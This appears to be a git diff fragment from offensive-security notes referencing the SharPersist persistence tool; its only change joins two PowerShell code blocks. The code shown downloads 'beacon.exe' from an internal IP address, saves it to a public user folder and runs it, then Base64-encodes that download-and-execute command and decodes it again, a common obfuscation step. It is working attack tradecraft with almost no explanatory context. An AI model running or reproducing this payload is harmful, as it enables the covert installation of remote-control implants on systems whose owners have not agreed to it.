@@ -5,8 +5,7 @@ https://github.com/mandiant/SharPersist
 ```powershell
 $code = ' $wc = New-Object System.Net.WebClient; $wc.DownloadFile("http://192.168.80.100/beacon.exe", "C:\users\public\beacon.exe"); Start-Process -FilePath "C:\users\public\beacon.exe"; '
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))
-```
-```powershell
+
 $Encoded="IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA"
 [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded))
 
